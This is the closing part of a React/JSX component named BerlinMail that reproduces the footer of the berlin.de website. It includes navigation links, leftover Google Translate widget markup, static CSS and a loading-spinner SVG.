                        </li>
                      </ul>
                    </li>
                    <li className="grid__item one-third">
                      <h3>Extra</h3>
                      <ul>
                        <li>
                          <a href="https://www.berlin.de/mail/">
                            Berlin.de-Mail
                          </a>
                        </li>
                        <li>
                          <a href="https://www.berlin.de/weihnachtsmarkt/">
                            Weihnachtsmärkte
                          </a>
                        </li>
                        <li>
                          <a href="https://www.berlin.de/wetter/">Wetter</a>
                        </li>
                        <li>
                          <a href="https://www.berlin.de/kultur-und-tickets/gratis/">
                            Gratis
                          </a>
                        </li>
                      </ul>
                    </li>
                    <li className="grid__item one-third">
                      <h3>In anderen Sprachen</h3>
                      <ul>
                        <li>
                          <a href="https://www.berlin.de/en/">English</a>
                        </li>
                        <li>
                          <a href="https://www.berlin.de/fr/">Français</a>
                        </li>
                        <li>
                          <a href="https://www.berlin.de/it/">Italiano</a>
                        </li>
                      </ul>
                    </li>
                  </ul>
                </nav>
              </div>
            </div>
          </footer>
          <div className="fradSection Skyscraper" bis_skin_checked={1} />
        </div>
        {/* pw-inner */}
      </div>
      {/* /page-wrapper */}
      <div className="fradSection Layer" bis_skin_checked={1} />
      <div
        id="goog-gt-tt"
        className="skiptranslate"
        dir="ltr"
        bis_skin_checked={1}
      >
        <div style={{ padding: "8px" }} bis_skin_checked={1}>
          <div bis_skin_checked={1}>
            <div className="logo" bis_skin_checked={1}>
              <img
                src="https://www.gstatic.com/images/branding/product/1x/translate_24dp.png"
                width={20}
                height={20}
                alt="Google Translate"
              />
            </div>
          </div>
        </div>
        <div
          className="top"
          style={{ padding: "8px", float: "left", width: "100%" }}
          bis_skin_checked={1}
        >
          <h1 className="title gray">Original text</h1>
        </div>
        <div className="middle" style={{ padding: "8px" }} bis_skin_checked={1}>
          <div className="original-text" bis_skin_checked={1} />
        </div>
        <div className="bottom" style={{ padding: "8px" }} bis_skin_checked={1}>
          <div className="activity-links" bis_skin_checked={1}>
            <span className="activity-link">
              Contribute a better translation
            </span>
          </div>
          <div className="started-activity-container" bis_skin_checked={1}>
            <hr
              style={{
                color: "#ccc",
                backgroundColor: "#ccc",
                height: "1px",
                border: "none",
              }}
            />
            <div className="activity-root" bis_skin_checked={1} />
          </div>
        </div>
        <div
          className="status-message"
          bis_skin_checked={1}
          style={{ display: "none" }}
        />
      </div>
      <style
        dangerouslySetInnerHTML={{
          __html:
            "\n      .tb_button {\n        padding: 1px;\n        cursor: pointer;\n        border-right: 1px solid #8b8b8b;\n        border-left: 1px solid #fff;\n        border-bottom: 1px solid #fff;\n      }\n      .tb_button.hover {\n        borer: 2px outset #def;\n        background-color: #f8f8f8 !important;\n      }\n      .ws_toolbar {\n        z-index: 100000;\n      }\n      .ws_toolbar .ws_tb_btn {\n        cursor: pointer;\n        border: 1px solid #555;\n        padding: 3px;\n      }\n      .tb_highlight {\n        background-color: yellow;\n      }\n      .tb_hide {\n        visibility: hidden;\n      }\n      .ws_toolbar img {\n        padding: 2px;\n        margin: 0px;\n      }\n    ",
        }}
      />
      <div className="goog-te-spinner-pos" bis_skin_checked={1}>
        <div className="goog-te-spinner-animation" bis_skin_checked={1}>
          <svg
            xmlns="http://www.w3.org/2000/svg"
            className="goog-te-spinner"
            width="96px"
            height="96px"
            viewBox="0 0 66 66"
          >
            <circle
              className="goog-te-spinner-path"
              fill="none"
              strokeWidth={6}
              strokeLinecap="round"
              cx={33}
              cy={33}
              r={30}
            />
          </svg>
        </div>
      </div>
    </div>
  );
}

export default BerlinMail;
